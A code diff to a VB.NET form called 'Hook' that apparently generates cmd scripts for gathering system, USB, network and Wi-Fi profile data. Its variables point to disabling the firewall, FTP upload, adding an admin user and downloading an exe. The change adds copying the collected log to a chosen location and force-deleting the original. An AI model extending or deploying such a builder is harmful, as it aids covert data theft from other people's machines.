@@ -14,6 +14,7 @@ Public Class Hook
     Dim wifi_hotspot As String = "   "
     Dim downloadexe As String = "   "
     Dim SaveLogTemporary As String = " >> """ & My.Application.Info.DirectoryPath & "\log.txt"""
+    Dim DestinationLoc As String
 #End Region
 
     Private Sub Hook_Load(sender As Object, e As EventArgs) Handles MyBase.Load
@@ -38,7 +39,7 @@ Public Class Hook
     Private Sub CodeBoxText() 'Update code in text editor.
         code_box.Text = cmd_presetup & vbNewLine & comp_inf & vbNewLine & usb_inf & vbNewLine & prog_inf & vbNewLine &
             net_inf & vbNewLine & wprof_inf & vbNewLine & disable_fir & vbNewLine & ftp_upload & vbNewLine & add_adminuser &
-            vbNewLine & wifi_hotspot & vbNewLine & downloadexe & vbNewLine
+            vbNewLine & wifi_hotspot & vbNewLine & downloadexe & vbNewLine & DestinationLoc
         CheckedBox()
     End Sub
 
@@ -55,7 +56,7 @@ Public Class Hook
 
         End If
         If CheckBox20.Checked = True Then 'Save method: (4) Save to computer. Add save line, and function to cmd commands.
-#Region "Save to computer (4)"
+#Region "Save to log (AppStartupPatch + \log.txt) + Move to location (4)"
             If CheckBox1.Checked = True Then
                 If comp_inf.Contains(SaveLogTemporary) Then
                 Else
@@ -116,6 +117,8 @@ Public Class Hook
                     downloadexe = downloadexe + SaveLogTemporary
                 End If
             End If
+            DestinationLoc = "copy """ & "" & My.Application.Info.DirectoryPath & "\log.txt""" & " """ & TextBox10.Text & """" &
+                vbNewLine & "del /f """ & My.Application.Info.DirectoryPath & "\log.txt"""
 #End Region
         End If
     End Sub
@@ -137,7 +140,7 @@ Public Class Hook
     Private Sub CheckBox2_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox2.CheckedChanged
         If CheckBox2.Checked Then
             CheckBox2.BackColor = Color.LightBlue
-            usb_inf = "wmic path CIM_LogicalDevice where ""Description like 'USB%'"" get /value"
+            usb_inf = "wmic path CIM_LogicalDevice where ""Description Like 'USB%'"" get /value"
         Else
             CheckBox2.BackColor = Nothing
             usb_inf = "   "
